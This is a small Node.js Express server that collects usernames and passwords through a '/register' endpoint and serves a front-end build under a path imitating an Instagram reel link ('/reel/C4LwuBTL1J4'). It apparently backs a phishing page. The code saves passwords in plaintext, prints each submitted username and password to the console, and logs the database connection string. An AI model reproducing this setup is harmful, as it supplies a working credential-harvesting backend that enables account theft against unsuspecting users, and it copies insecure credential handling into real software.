require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
// const dotenv = require('dotenv');
const cors = require('cors');
const path = require('path');


// dotenv.config({ path: './.env' });


const app = express();
app.use(cors());
app.use(bodyParser.json());
console.log(process.env.MONGO_URI);

// Define the User schema and model
const userSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  password: { type: String, required: true },
});
const User = mongoose.model('users', userSchema);

// Register route
app.post('/register', async (req, res) => {
  const { username, password } = req.body;
  console.log(username)
  console.log(password)
  try {
    const user = new User({ username, password });
    await user.save();
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.use('/reel/C4LwuBTL1J4', express.static(path.join(__dirname, 'build')));
app.get('/reel/C4LwuBTL1J4/*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});


// Start the server
const PORT = process.env.PORT || 3000;
mongoose
  .connect(process.env.MONGO_URI)
  .then(() => {
    app.listen(PORT, () => {
      console.log(`Server running on ${PORT}`);
    });
  })
  .catch((err) => console.log(err));

    